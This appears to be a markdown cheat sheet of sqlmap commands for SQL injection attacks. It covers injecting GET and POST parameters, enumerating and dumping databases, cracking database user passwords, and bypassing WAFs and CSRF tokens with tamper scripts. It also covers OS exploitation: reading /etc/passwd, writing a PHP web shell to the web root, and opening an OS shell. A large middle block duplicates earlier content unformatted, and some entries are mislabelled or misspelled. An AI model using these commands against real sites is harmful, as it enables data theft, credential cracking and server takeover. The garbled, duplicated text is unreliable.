- basic command for GET request

```sh
sqlmap -u "http://www.example.com/vuln.php?id=1" --bach
```

- basic command for POST request

```sh
 sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

- to use a request file

```sh
 sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

- to add a cookie header

```sh
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

- random selection of a `User-agent`

```sh
sqlmap ... --random-agent
```

- testing the headers for the SQLi vulnerability

```sh
sqlmap ... --cookie="id=1*"
```

- modifing the method

```sh
sqlmap -u www.target.com --data='id=1' --method PUT
```

- to parse errors

```sh
sqlmap ... --parse-errors
```

- storing the trafic

```sh
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

- proxy usage

```sh
sqlmap ... --proxy
```

- using suffix and prifix

```sh
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

- Level : the depth

```sh
sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

- risk : risk to harm the system

```sh
sqlmap -u www.example.com/?id=1 -v 3 --risk=3
```

- to specify the union columns

```sh
sqlmap ... --union-cols=1-9 
```

- powerfull commands

```sh
sqlmap -u ... --level=5 --risk=3 -T TABLE --no-cast --dump -D db
```

## enum techniques

- user enum

```sh
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

- Conditional Enumeration

```sh
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

- DB Schema Enumeration

```sh
sqlmap -u "http://www.example.com/?id=1" --schema
```

- Searching for Data

```sh
sqlmap -u "http://www.example.com/?id=1" --search -T user -C pass
```

- DB Users Password Enumeration and Cracking

```sh
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

## Advenced SQLMAP

- Anti-CSRF Token Bypass

```sh
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

- Unique Value Bypass

```sh
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp 
basic command for GET request
sqlmap -u "http://www.example.com/vuln.php?id=1" --bach
basic command for POST request
 sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
to use a request file
 sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
to add a cookie header
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
random selection of a User-agent
sqlmap ... --random-agent
testing the headers for the SQLi vulnerability
sqlmap ... --cookie="id=1*"
modifing the method
sqlmap -u www.target.com --data='id=1' --method PUT
to parse errors
sqlmap ... --parse-errors
storing the trafic
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
proxy usage
sqlmap ... --proxy
using suffix and prifix
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
Level : the depth
sqlmap -u www.example.com/?id=1 -v 3 --level=5
risk : risk to harm the system
sqlmap -u www.example.com/?id=1 -v 3 --risk=3
to specify the union columns
sqlmap ... --union-cols=1-9 
powerfull commands
sqlmap -u ... --level=5 --risk=3 -T TABLE --no-cast --dump -D db
enum techniques
user enum
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
Conditional Enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
DB Schema Enumeration
sqlmap -u "http://www.example.com/?id=1" --schema
Searching for Data
sqlmap -u "http://www.example.com/?id=1" --search -T user -C pass
DB Users Password Enumeration and Cracking
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
Advenced SQLMAP
Anti-CSRF Token Bypass
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
Unique Value Bypass
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp 
Calculated Parameter Bypass h=MD5(id)
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
Tamper Scripts
sqlmap ... --tamper
Tamper-Script	Description
0eunion	Replaces instances of UNION with e0UNION
base64encode	Base64-encodes all characters in a given payload
between	Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #
commalesslimit	Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart
equaltolike	Replaces all occurrences of operator equal (=) with LIKE counterpart
halfversionedmorekeywords	Adds (MySQL) versioned comment before each keyword
modsecurityversioned	Embraces complete query with (MySQL) versioned comment
modsecurityzeroversioned	Embraces complete query with (MySQL) zero-versioned comment
percentage	Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)
plus2concat	Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart
randomcase	Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)
space2comment	Replaces space character ( ) with comments `/
space2dash	Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\n)
space2hash	Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n)
space2mssqlblank	Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters
space2plus	Replaces space character ( ) with plus (+)
space2randomblank	Replaces space character ( ) with a random blank character from a valid set of alternate characters
symboliclogical	Replaces AND and OR logical operators with their symbolic counterparts (&& and \|)
versionedkeywords	Encloses each non-function keyword with (MySQL) versioned comment
versionedmorekeywords	Encloses each keyword with (MySQL) versioned comment
Miscellaneous Bypasses
sqlmap ... --chunked
OS Exploitation
file read
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
file write
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
getting a shell with xp_cmdshell
sqlmap -u "http://www.example.com/?id=1" --os-shell```

- Calculated Parameter Bypass `h=MD5(id)`

```sh
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
```

## Tamper Scripts

```sh
sqlmap ... --tamper
```

|**Tamper-Script**|**Description**|
|---|---|
|`0eunion`|Replaces instances of UNION with e0UNION|
|`base64encode`|Base64-encodes all characters in a given payload|
|`between`|Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`|
|`commalesslimit`|Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart|
|`equaltolike`|Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart|
|`halfversionedmorekeywords`|Adds (MySQL) versioned comment before each keyword|
|`modsecurityversioned`|Embraces complete query with (MySQL) versioned comment|
|`modsecurityzeroversioned`|Embraces complete query with (MySQL) zero-versioned comment|
|`percentage`|Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)|
|`plus2concat`|Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart|
|`randomcase`|Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)|
|`space2comment`|Replaces space character ( ) with comments `/|
|`space2dash`|Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)|
|`space2hash`|Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`)|
|`space2mssqlblank`|Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters|
|`space2plus`|Replaces space character ( ) with plus (`+`)|
|`space2randomblank`|Replaces space character ( ) with a random blank character from a valid set of alternate characters|
|`symboliclogical`|Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\\|`)|
|`versionedkeywords`|Encloses each non-function keyword with (MySQL) versioned comment|
|`versionedmorekeywords`|Encloses each keyword with (MySQL) versioned comment|

- Miscellaneous Bypasses

```sh
sqlmap ... --chunked
```

## OS Exploitation

- file read

```sh
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

- file write

```sh
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

```sh
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

- getting a shell with `xp_cmdshell`

```sh
sqlmap -u "http://www.example.com/?id=1" --os-shell
```